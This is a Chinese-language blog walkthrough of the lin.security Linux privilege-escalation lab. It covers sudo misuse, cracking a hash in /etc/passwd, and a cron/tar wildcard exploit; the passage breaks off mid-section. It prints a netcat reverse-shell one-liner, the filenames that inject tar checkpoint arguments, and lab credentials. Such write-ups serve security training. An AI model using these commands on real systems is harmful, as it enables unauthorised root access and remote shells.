@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>in.security 提权靶场 - Geekby&#39;s Blog</title><meta name="Description" content="in.security 提权靶场"><meta property="og:title" content="in.security 提权靶场" />
+<meta property="og:description" content="in.security 提权靶场" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-10-31T09:00:00+08:00" />
+<meta property="article:modified_time" content="2019-10-31T09:00:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="in.security 提权靶场"/>
+<meta name="twitter:description" content="in.security 提权靶场"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/" /><link rel="prev" href="https://www.geekby.site/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/" /><link rel="next" href="https://www.geekby.site/2019/11/apache-shiro-padding-oracle-attack%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "in.security 提权靶场",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2019\/10\/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "提权, 提权靶场","wordcount":  707 ,
+        "url": "https:\/\/www.geekby.site\/2019\/10\/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA\/","datePublished": "2019-10-31T09:00:00+08:00","dateModified": "2019-10-31T09:00:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "in.security 提权靶场"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">in.security 提权靶场</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="far fa-folder fa-fw"></i>靶场</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-10-31">2019-10-31</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 707 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-linux-下的权限划分">1 linux 下的权限划分</a>
+      <ul>
+        <li><a href="#11-用户和组">1.1 用户和组</a></li>
+        <li><a href="#12-etcpasswd-文件">1.2 /etc/passwd 文件</a></li>
+        <li><a href="#13-etcshadow-文件">1.3 /etc/shadow 文件</a></li>
+        <li><a href="#14-文件权限">1.4 文件权限</a></li>
+        <li><a href="#15-特殊权限">1.5 特殊权限</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-sudo-权限配置不当提权">2 sudo 权限配置不当提权</a>
+      <ul>
+        <li><a href="#21-binash">2.1 /bin/ash</a></li>
+        <li><a href="#22-usrbinawk">2.2 /usr/bin/awk</a></li>
+        <li><a href="#23-usrbincurl">2.3 /usr/bin/curl</a></li>
+        <li><a href="#24-usrbinfind">2.4 /usr/bin/find</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-etcpasswd的哈希">3 /etc/passwd的哈希</a></li>
+    <li><a href="#4-利用定时任务cron以及通配符">4 利用定时任务cron以及通配符</a></li>
+    <li><a href="#5-利用隐藏文件">5 利用隐藏文件</a></li>
+    <li><a href="#6-利用-suid">6 利用 SUID</a>
+      <ul>
+        <li><a href="#61-方案一">6.1 方案一</a></li>
+        <li><a href="#62-方案二">6.2 方案二</a></li>
+      </ul>
+    </li>
+    <li><a href="#7-nfs-提权">7 NFS 提权</a></li>
+    <li><a href="#8-利用-docker-组提权">8 利用 docker 组提权</a></li>
+    <li><a href="#9-systems-配置不当提权">9 systems 配置不当提权</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="insecurity-提权靶场">in.security 提权靶场</h1>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031092159.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031092159.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031092159.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031092159.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031092159.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031092159.png-water_print" />
+lin.security 靶场 是 Linux 配置问题导致提权的靶场，它基于Ubuntu（18.04 LTS）的 Linux 虚拟机，靶场提供许多权限提升的漏洞供我们练习关于 linux 权限的相关知识，下面是这个靶场的下载链接：
+<a href="https://in.security/downloads/lin.security_v1.0.ova" target="_blank" rel="noopener noreffer">https://in.security/downloads/lin.security_v1.0.ova</a></p>
+<p>靶场低权限用户：<code>bob:secret</code></p>
+<p><strong>查看当前用户的权限</strong>：<code>whoami</code>、<code>id</code></p>
+<p><strong>查看系统的发行版本和内核版本</strong>：<code>lsb_release -a</code>、<code>uname -a</code></p>
+<h2 id="1-linux-下的权限划分">1 linux 下的权限划分</h2>
+<h3 id="11-用户和组">1.1 用户和组</h3>
+<p>用户组在 linux 系统上起着重要作用，它们为选定的用户提供了一种彼此共享文件的简便方法。它们还使系统管理员可以更有效地管理用户权限，因为他们可以将权限分配给组而不是单个用户。</p>
+<p>Linux 用户分为管理员和普通用户，普通用户又分为系统用户和自定义用户。</p>
+<ol>
+<li>系统管理员：即 root 帐户，UID 号为 0，拥有所有系统权限，它类似于 Windows 系统中的 administrator 帐户，是整个系统的所有者。</li>
+<li>系统用户：Linux 为满足自身系统管理所内建的账号，通常在安装过程中自动创建，不能用于登录操作系统。UID 在 1-499 之间(Centos 7 为 1-999 之间)。像上面的 sshd、 pulse 等等用户即是此类用户。它类似于 Windows 中的 system 帐户，当然权限远没有 system 帐户高。</li>
+<li>自定义用户：由 root 管理员创建供用户登录系统进行操作使用的账号，UID 在 500 以上(CentOS7 为 1000 以上)。它类似于 Windows 系统中 users 用户组中的帐户。</li>
+</ol>
+<p>在 Linux 中的每个用户必须属于一个组，不能独立于组外在 Linux 中每个文件有所有者、所在组、其它组的概念同样，用户组的信息我们可以在 /etc/group 中查看</p>
+<h3 id="12-etcpasswd-文件">1.2 /etc/passwd 文件</h3>
+<p>在 Linux 的 <code>/etc/passwd</code> 文件中每个用户都有一个对应的记录行，它记录了这个用户的一些基本属性。系统管理员经常会接触到这个文件的修改以完成对用户的管理工作。</p>
+<p>给 linux 系统添加账户：<code>useradd -g group -d /home/to/user -m username</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101512.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101512.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101512.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101512.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101512.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101512.png-water_print" /></p>
+<p>字段含义：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101745.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101745.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101745.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101745.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101745.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101745.png-water_print" /></p>
+<h3 id="13-etcshadow-文件">1.3 /etc/shadow 文件</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031102803.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031102803.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031102803.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031102803.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031102803.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031102803.png-water_print" /></p>
+<p>字段含义：</p>
+<p>用户名:加密密码(! ! 表示无密码):最后一次修改时间:最小修改时间间隔:密码有效期:密码需要变更前的警告天数:密码过期后的宽限时间:账号失效时间:保留字段</p>
+<p><strong>加密的密码具有固定格式：</strong> <code>$id$salt$encrypted </code></p>
+<ul>
+<li>id 表示加密算法，1 代表 MD5，5 代表 SHA-256，6 代表 SHA-512</li>
+<li>salt 为盐值，系统随机生成</li>
+<li>encrypted 表示密码的 hash 值</li>
+</ul>
+<h3 id="14-文件权限">1.4 文件权限</h3>
+<p>linux 系统中，一切皆文件，包括普通文件、目录、设备、套接字等</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031103535.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031103535.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031103535.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031103535.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031103535.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031103535.png-water_print" /></p>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>rwx对目录的权限<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>r：表示具有读取目录结构列表的权限，表示可以查询该目录下的文件名数据。 即可以 <code>ls</code></p>
+<p>w：表示可以对该文件夹下的文件或目录进行添加、删除、重命名、复制、剪切等操作</p>
+<p>x：表示可以用户能否进入该目录成为工作目录（当没有 x 权限，但是有 w 权限时，也是无法向文件写入文件的）</p>
+</div>
+        </div>
+    </div>
+<h3 id="15-特殊权限">1.5 特殊权限</h3>
+<ul>
+<li>SUID
+<ul>
+<li>该文件在执行的时候，会切换到所有者的权限执行</li>
+</ul>
+</li>
+<li>SGID
+<ul>
+<li>该文件在执行的时候，会切换到所有组的权限执行</li>
+</ul>
+</li>
+<li>SBIT
+<ul>
+<li>只有自己和管理员可以操作当前文件</li>
+</ul>
+</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105116.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105116.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105116.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105116.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105116.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031105116.png-water_print" /></p>
+<h2 id="2-sudo-权限配置不当提权">2 sudo 权限配置不当提权</h2>
+<p>sudo 其实是很常用的命令了，sudo 权限则是 root 把本来只能超级用户执行的命令赋予普通用户执行，这里的命令指的是系统命令，对于 linux 来说一切皆是文件，所以系统命令也是一个文件。</p>
+<p>一般来讲当管理员需要某个用户在执行 root 权限的命令时，会去配置 sudo。具体是修改 <code>/etc/sudoers</code> 这个文件。但是普通用户其实是查看和操作这个文件的，他只能查看自己是否被配置了 sudo 权限。普通用户可以采用 <code>sudo -l</code> 这个命令来查看自己是否有 sudo 配置。
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031093053.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031093053.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031093053.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031093053.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031093053.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031093053.png-water_print" /></p>
+<p>bob 这个用户可以执行很多的命令，利用这些命令可以简单直接提升到 root 权限。</p>
+<h3 id="21-binash">2.1 /bin/ash</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031093521.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031093521.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031093521.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031093521.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031093521.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031093521.png-water_print" /></p>
+<h3 id="22-usrbinawk">2.2 /usr/bin/awk</h3>
+<p>查看密码文件 <code>/etc/shadow</code>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031094733.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031094733.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031094733.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031094733.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031094733.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031094733.png-water_print" /></p>
+<h3 id="23-usrbincurl">2.3 /usr/bin/curl</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095628.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095628.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095628.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095628.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095628.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095628.png-water_print" /></p>
+<h3 id="24-usrbinfind">2.4 /usr/bin/find</h3>
+<p>获取shell
+<code>find . -exec /bin/sh \; -quit</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095809.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095809.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095809.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095809.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095809.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095809.png-water_print" /></p>
+<p>可以发现，哪怕是 find 这种查找命令被赋予了 sudo，也能提权为 root 权限，只要我们能够巧妙的利用执行这些命令。限于篇幅，就不给出所有命令的利用方式了，我们可以参考资源
+<a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreffer">https://gtfobins.github.io/</a> ，里面涵盖了许多可以被利用的命令。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095414.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095414.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095414.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095414.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095414.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031095414.png-water_print" /></p>
+<h2 id="3-etcpasswd的哈希">3 /etc/passwd的哈希</h2>
+<p>linux 的用户密码哈希存储在 <code>/etc/shadow</code> 这个文件，而这个文件普通用户是无法查看的。而普通用户能够查看到的则是 <code>/etc/passwd</code> 这个文件。如果我们查看 <code>/etc/passwd</code> 通常会看到以下内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">root❌0:0:root:/root:/bin/bash
+</code></pre></td></tr></table>
+</div>
+</div><p>如果有一个账户的第二列是密码哈希，如果该列为 x 则代表密码哈希存储在 <code>/etc/shadow</code> 文件上。而在 <code>lin.security</code> 虚拟机上可以看到像 <code>insecurity</code> 这么一个账户，这个账号的 <code>uid</code> 和 <code>gid</code> 都为 0。用类似 <code>Johnny</code> 或者 <code>hash-identifier</code> 会被表示成 <code>descrypt</code>，进而可以被破解出来。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100550.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100550.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100550.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100550.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100550.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100550.png-water_print" /></p>
+<p>通过查询，可得密码为P@ssw0rd11。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100710.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100710.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100710.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100710.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100710.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100710.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100948.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100948.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100948.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100948.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100948.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031100948.png-water_print" /></p>
+<h2 id="4-利用定时任务cron以及通配符">4 利用定时任务cron以及通配符</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101109.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101109.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101109.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101109.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101109.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101109.png-water_print" /></p>
+<p>每隔1分钟定期执行 <code>/etc/cron.daily/backup</code> 这个文件。
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101427.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101427.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101427.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101427.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101427.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20191031101427.png-water_print" /></p>
+<p>这里涉及到了利用通配符进行 Linux 本地提权，我们需要另开一个 bob 的 ssh 会话。</p>
+<p>使用 msfvenom 生成 nc 反弹一句话，命令如下：</p>
+<p><code>-p</code>：payload</p>
+<p><code>R</code>：RAW 原始数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@kali:~# msfvenom -p cmd/unix/reverse_netcat <span class="nv">lhost</span><span class="o">=</span>127.0.0.1 <span class="nv">lport</span><span class="o">=</span><span class="m">8888</span> R
+<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: cmd from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: <span class="m">91</span> bytes
+mkfifo /tmp/kuhdq<span class="p">;</span> nc 127.0.0.1 <span class="m">8888</span> 0&lt;/tmp/kuhdq <span class="p">|</span> /bin/sh &gt;/tmp/kuhdq 2&gt;<span class="p">&amp;</span>1<span class="p">;</span> rm /tmp/kuhdq
+</code></pre></td></tr></table>
+</div>
+</div><p>然后分别执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bob@linsecurity:~$ <span class="nb">echo</span> <span class="s2">&#34;mkfifo /tmp/kuhdq; nc 127.0.0.1 8888 0&lt;/tmp/kuhdq | /bin/sh &gt;/tmp/kuhdq 2&gt;&amp;1; rm /tmp/kuhdq&#34;</span> &gt; shell.sh <span class="o">&amp;&amp;</span> chmod +x shell.sh
+bob@linsecurity:~$ <span class="nb">echo</span> <span class="s2">&#34;&#34;</span> &gt; <span class="s2">&#34;--checkpoint-action=exec=sh shell.sh&#34;</span>
+bob@linsecurity:~$ <span class="nb">echo</span> <span class="s2">&#34;&#34;</span> &gt; --checkpoint<span class="o">=</span><span class="m">1</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>我们在另外一个会话终端开启 nc 监听：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
